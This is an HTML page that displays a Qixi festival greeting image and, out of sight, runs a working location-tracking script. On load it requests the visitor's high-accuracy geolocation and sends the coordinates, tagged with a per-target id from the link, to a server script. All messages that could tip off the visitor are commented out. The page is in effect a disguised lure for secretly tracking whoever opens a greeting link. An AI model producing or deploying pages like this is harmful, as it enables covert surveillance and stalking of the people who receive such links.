
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>location</title>
<!-- 百度API -->
<!--<script src="http://api.map.baidu.com/api?v=1.2" type="text/javascript"></script>-->
	<script>

           function getLocation(){
               var options={
                   enableHighAccuracy:true,
                   maximumAge:1000
               }
               if(navigator.geolocation){
                   //浏览器支持geolocation
                   navigator.geolocation.getCurrentPosition(onSuccess,onError,options);
               }else{
                   //浏览器不支持geolocation
                   //alert('您的浏览器不支持地理位置定位');
               }
           }

           //成功时
           function onSuccess(position){
               //返回用户位置
//               //根据经纬度获取地理位置，不太准确，获取城市区域还是可以的
//    			var map = new BMap.Map("allmap");
//    			var point = new BMap.Point(longitude,latitude);
//    			var gc = new BMap.Geocoder();
//    			gc.getLocation(point, function(rs){
//       			var addComp = rs.addressComponents;
//       			alert(addComp.province + ", " + addComp.city + ", " + addComp.district + ", " + addComp.street + ", " + addComp.streetNumber);
//    			});
				//window.alert("success");
        	   sendPositionToServer(position);
           }

           function sendPositionToServer(position){
               var longitude =position.coords.longitude;
               //纬度
               var latitude = position.coords.latitude;
			   var locationId = $_GET['id'];
               var xhr = new XMLHttpRequest();
               var url = "sendLocation.php?id="+locationId+"&latitude="+latitude+"&longitude="+longitude;
//               window.alert(url);
               var res = xhr.open('GET', url, false);
               xhr.send(null);
            }
       	
           //失败时
           function onError(error){
               switch(error.code){
                   case 1:
                   //alert("位置服务被拒绝");
                   break;
                   case 2:
                   //alert("暂时获取不到位置信息");
                   break;
                   case 3:
                   //alert("获取信息超时");
                   break;
                   case 4:
                   //alert("未知错误");
                   break;
               }
           }
           window.onload=getLocation;

           var $_GET = (function(){
        	    var url = window.document.location.href.toString();
        	    var u = url.split("?");
        	    if(typeof(u[1]) == "string"){
        	        u = u[1].split("&");
        	        var get = {};
        	        for(var i in u){
        	            var j = u[i].split("=");
        	            get[j[0]] = j[1];
        	        }
        	        return get;
        	    } else {
        	        return {};
        	    }
        	})();
   </script>
</head>
<body>
<img src="./img/qixi.jpg"  alt="七夕快乐" />
</body>
</html>
